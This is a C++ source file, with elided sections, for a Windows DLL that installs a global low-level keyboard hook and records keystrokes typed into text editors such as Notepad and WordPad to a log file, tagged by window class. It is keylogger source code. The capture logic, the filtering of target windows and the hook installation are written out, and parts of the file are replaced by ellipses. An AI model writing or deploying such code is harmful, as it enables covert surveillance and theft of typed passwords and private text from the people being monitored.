// cl /LD GUIhook.cpp /link /machine:x64 /out:GUIhook.dll user32.lib kernel32.lib
// GUI-specific keyboard hook (uses WH_KEYBOARD_LL but filters for GUI applications)
#include <windows.h>
#include <fstream>
#include <string>
...
bool IsTargetGUIApplication(HWND hWnd) {
    char className[256];
    char windowTitle[256];
    GetClassNameA(hWnd, className, sizeof(className));
    GetWindowTextA(hWnd, windowTitle, sizeof(windowTitle));
    
    // Check for text editor applications
    return (strstr(className, "Notepad") != nullptr ||
            strstr(className, "Edit") != nullptr ||
            strstr(className, "WordPad") != nullptr ||
            strstr(className, "RichEdit") != nullptr ||
            strstr(windowTitle, "Notepad") != nullptr ||
            strstr(windowTitle, "WordPad") != nullptr ||
            strstr(windowTitle, "Text") != nullptr ||
            strstr(windowTitle, ".txt") != nullptr);
}

LRESULT CALLBACK GUIKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // Get the current foreground window
        HWND foregroundWindow = GetForegroundWindow();
        
        // Only log if it's a target GUI application
        if (IsTargetGUIApplication(foregroundWindow)) {
            ...
            if (!keyString.empty()) {
                ...
                std::string context = className;
                
                // Read existing log to check last context
                ...
                // Check if we need a new context header
                if (lastLine.find(context + ":") != 0) {
                    if (!lastLine.empty()) log << std::endl;
                    log << context << ": " << keyString;
                } else {
                    log << keyString;
                }
                log.close();
...
DWORD WINAPI HookThread(LPVOID) {
    ...
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, GUIKeyboardProc, hInstance, 0);
    
    std::ofstream log("log.txt", std::ios::app);
    log << "[GUI] GUI-specific keyboard hook installed" << std::endl;
    log.close();
